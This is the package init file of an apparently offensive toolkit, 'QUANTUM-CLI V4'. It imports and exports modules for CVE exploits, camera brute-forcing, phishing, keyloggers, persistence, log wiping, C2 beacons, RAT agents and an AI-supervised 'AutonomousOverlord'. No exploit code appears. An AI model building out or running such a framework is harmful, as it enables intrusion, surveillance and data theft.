"""QUANTUM-CLI V4 — src/quantum package (split of the single-file V3.1 spec).

The single file quantum_cli.py is THE SPEC; any behavioral divergence of this
package is a bug in the package.
"""
from __future__ import annotations

from quantum.core.env import (AGENT, KEYS_DIR, LOOT_DIR, LOG_DIR, MODELS_DIR,
                              PRIV, PUB, QCLI_DIR, OS_NAME, __version__,
                              load_env_file, local_ip, local_scope, no_ai_mode)
from quantum.core.logging import MitreMapper, _tail_jsonl, log
from quantum.core.opsec import OPSEC, network_aware_jitter, run, tcp_probe
from quantum.core.grayfish import GRAYFISH, GrayFish
from quantum.core.jurgen import QBrain
from quantum.core.deps import check_deps

from quantum.ai.supervisor import AI_Supervisor
from quantum.ai.bootstrap import DM

from quantum.recon.scan import ReconModule
from quantum.recon.fingerprint import Validator, VALIDATOR, fingerprint
from quantum.recon.osint import osint_lookup
from quantum.recon.doh import DoH
from quantum.recon.wsdiscovery import onvif_device_info, wsdiscovery_cameras

from quantum.camwar.engine import CAMWAR, CamWarEngine
from quantum.camwar.vendors import vendor_from_str
from quantum.camwar.rtsp import parse_rtsp_header, rtsp_probe
from quantum.camwar.brute_v3 import BruteEngine, BruteEngineV3, PhishEngine

from quantum.weapons.polymorph import PolyMorphEngineV3
from quantum.weapons.registry import (ZERO_DAY_REGISTRY, ExploitOrchestrator,
                                      registry, resolve_weapon)
from quantum.weapons.techniques.emojisms import (EMOJI_MAP, EMOJI_REVERSE,
                                                  emoji_decode, emoji_encode)
from quantum.weapons.techniques.flashfill import flashfill, flashfill_registry
from quantum.weapons.techniques.macreset import macos_recovery_reset
from quantum.weapons.techniques.cagebreak import cagebreak
from quantum.weapons.kernel_v3 import (check_boothole, check_baron_samedit,
                                       check_nftables_dblfree,
                                       check_nftables_uaf, check_overlayfs,
                                       check_pwnkit, exploit_dirtypipe,
                                       v3_dirtypipe)
from quantum.weapons.legacy import (check_follina, check_ms17010,
                                    check_petitpotam, check_printnightmare,
                                    check_proxylogon, check_zerologon,
                                    exploit_zerologon, zerologon_dump)
from quantum.weapons.media_v3 import (check_apple_imageio, check_libwebp,
                                      check_webkit_escape, check_whatsapp_voip,
                                      v3_mshtml_maldoc)
from quantum.weapons.remote_v3 import (v3_citrix_path, v3_citrixbleed,
                                       v3_confluence_ognl, v3_ios_admin,
                                       v3_log4shell, v3_moveit_probe,
                                       v3_panos_cmd, v3_sambacry,
                                       v3_vcenter_upload, v3_weblogic_console)

from quantum.postexploit.killswitch import KILLSWITCH, TASKQ, kill_all_implants
from quantum.postexploit.persistx import persistx
from quantum.postexploit.kitlogger import stage_keylogger
from quantum.postexploit.footprint import (footprint_wipe_posix,
                                            footprint_wipe_windows)
from quantum.postexploit.harvest import DataHarvester, auto_parse_loot

from quantum.c2.app import (FEDERATION, QCLI_API, Turbine, decrypt_beacon,
                            keygen, make_c2)
from quantum.c2.wsgi import run_c2
from quantum.c2.transport import (DoHC2BeaconServer, FoxAcid, QuantumInsert,
                                  SwitchboardICMP)
from quantum.c2.agents.ghostfang import (CottonMouth, OBSIDIAN_PS1,
                                          generate_posix_agent)
from quantum.c2.agents.ghostdns import (PersistentDoHChannel, backoff_seconds,
                                         doh_reverse_beacon, doh_task_check,
                                         generate_dns_agent)
from quantum.anon import (KODACHI_NOTE, anon_fetch, anon_status,
                           write_dnscrypt_config, write_proxychains)
from quantum.brute import (CRUNCH_NOTE, SYMBOLS)
from quantum.brute.crunch import (detect_crunch as crunch_detect,
                                   estimate_count as crunch_estimate,
                                   estimate_size as crunch_estimate_size,
                                   expand_charset as crunch_charset,
                                   generate as crunch_generate,
                                   write_wordlist as crunch_write)
from quantum.rat import (dispatch as rat_dispatch,
                         generate_rat_agent as rat_generate_agent,
                         snapshot as rat_fleet_snapshot)

from quantum.overlord.autonomous import AutonomousOverlord
from quantum.overlord.engines import (GODSUPREME, EpiScribe, MFP, Somberknight,
                                       Trinity, UnitedDrake, Wildfire)

from quantum.dash import DASH_HTML

__all__ = [
    "__version__", "OS_NAME", "QCLI_DIR", "LOG_DIR", "LOOT_DIR", "KEYS_DIR",
    "MODELS_DIR", "PRIV", "PUB", "AGENT", "load_env_file", "local_ip",
    "local_scope", "no_ai_mode", "log", "_tail_jsonl", "MitreMapper",
    "OPSEC", "network_aware_jitter", "run", "tcp_probe", "GRAYFISH", "GrayFish",
    "QBrain", "check_deps", "AI_Supervisor", "DM", "ReconModule", "Validator",
    "VALIDATOR", "fingerprint", "osint_lookup", "DoH", "onvif_device_info",
    "wsdiscovery_cameras", "CAMWAR", "CamWarEngine", "vendor_from_str",
    "parse_rtsp_header", "rtsp_probe", "BruteEngine", "BruteEngineV3",
    "PhishEngine", "PolyMorphEngineV3", "ZERO_DAY_REGISTRY",
    "ExploitOrchestrator", "registry", "resolve_weapon", "EMOJI_MAP",
    "emoji_decode", "emoji_encode", "flashfill", "flashfill_registry",
    "macos_recovery_reset", "cagebreak", "check_boothole",
    "check_baron_samedit", "check_nftables_dblfree", "check_nftables_uaf",
    "check_overlayfs", "check_pwnkit", "exploit_dirtypipe", "v3_dirtypipe",
    "check_follina", "check_ms17010", "check_petitpotam", "check_printnightmare",
    "check_proxylogon", "check_zerologon", "exploit_zerologon",
    "zerologon_dump", "check_apple_imageio", "check_libwebp",
    "check_webkit_escape", "check_whatsapp_voip", "v3_mshtml_maldoc",
    "v3_citrix_path", "v3_citrixbleed", "v3_confluence_ognl", "v3_ios_admin",
    "v3_log4shell", "v3_moveit_probe", "v3_panos_cmd", "v3_sambacry",
    "v3_vcenter_upload", "v3_weblogic_console", "EMOJI_REVERSE", "KILLSWITCH", "TASKQ",
    "kill_all_implants", "persistx", "stage_keylogger", "footprint_wipe_posix",
    "footprint_wipe_windows", "DataHarvester", "auto_parse_loot", "FEDERATION",
    "QCLI_API", "Turbine", "decrypt_beacon", "keygen", "make_c2", "run_c2",
    "DoHC2BeaconServer", "FoxAcid", "QuantumInsert", "SwitchboardICMP",
    "CottonMouth", "OBSIDIAN_PS1", "generate_posix_agent", "doh_reverse_beacon",
    "doh_task_check", "generate_dns_agent", "AutonomousOverlord", "GODSUPREME",
    "EpiScribe", "MFP", "Somberknight", "Trinity", "UnitedDrake", "Wildfire",
    "DASH_HTML", "PersistentDoHChannel", "backoff_seconds", "KODACHI_NOTE",
    "anon_status", "anon_fetch", "write_proxychains", "write_dnscrypt_config",
    "CRUNCH_NOTE", "SYMBOLS", "crunch_detect", "crunch_estimate",
    "crunch_estimate_size", "crunch_charset", "crunch_generate", "crunch_write",
    "rat_dispatch", "rat_generate_agent", "rat_fleet_snapshot",
]
